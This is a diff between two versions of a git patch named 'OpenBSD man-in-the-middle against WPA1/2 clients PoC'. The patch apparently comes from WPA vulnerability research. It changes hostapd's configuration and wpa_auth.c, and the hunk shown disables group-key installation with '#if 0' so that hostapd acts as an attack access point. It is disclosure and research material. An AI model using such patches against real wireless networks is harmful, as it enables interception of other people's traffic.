@@ -1,12 +1,12 @@
-From 286f76bd65cacdeebd2b115f4a0918882bbcbe16 Mon Sep 17 00:00:00 2001
+From a4ae5bae779f55b3eaf68bcf391005c096da1ab9 Mon Sep 17 00:00:00 2001
 From: Mathy <vanhoefm@users.noreply.github.com>
 Date: Thu, 20 Jul 2017 21:46:59 +0200
 Subject: [PATCH] OpenBSD man-in-the-middle against WPA1/2 clients PoC
 
 ---
  hostapd/hostapd.conf | 12 ++++++------
- src/ap/wpa_auth.c    | 39 +++++++++++++++++++++++++++++++++++++++
- 2 files changed, 45 insertions(+), 6 deletions(-)
+ src/ap/wpa_auth.c    | 41 +++++++++++++++++++++++++++++++++++++++++
+ 2 files changed, 47 insertions(+), 6 deletions(-)
 
 diff --git a/hostapd/hostapd.conf b/hostapd/hostapd.conf
 index fa9a855a6..aa4571e23 100644
@@ -61,7 +61,7 @@ index fa9a855a6..aa4571e23 100644
  # Time interval for rekeying GTK (broadcast/multicast encryption keys) in
  # seconds. (dot11RSNAConfigGroupRekeyTime)
 diff --git a/src/ap/wpa_auth.c b/src/ap/wpa_auth.c
-index 358708648..d99f59fed 100644
+index 358708648..9929fd108 100644
 --- a/src/ap/wpa_auth.c
 +++ b/src/ap/wpa_auth.c
 @@ -53,6 +53,8 @@ static void wpa_group_get(struct wpa_authenticator *wpa_auth,
@@ -173,6 +173,22 @@ index 358708648..d99f59fed 100644
  	wpa_send_eapol(sm->wpa_auth, sm,
  		       WPA_KEY_INFO_SECURE | WPA_KEY_INFO_MIC |
  		       WPA_KEY_INFO_ACK |
+@@ -2895,6 +2934,7 @@ static int wpa_group_config_group_keys(struct wpa_authenticator *wpa_auth,
+ {
+ 	int ret = 0;
+ 
++#if 0
+ 	if (wpa_auth_set_key(wpa_auth, group->vlan_id,
+ 			     wpa_cipher_to_alg(wpa_auth->conf.wpa_group),
+ 			     broadcast_ether_addr, group->GN,
+@@ -2916,6 +2956,7 @@ static int wpa_group_config_group_keys(struct wpa_authenticator *wpa_auth,
+ 			ret = -1;
+ 	}
+ #endif /* CONFIG_IEEE80211W */
++#endif
+ 
+ 	return ret;
+ }
 -- 
 2.13.2
 
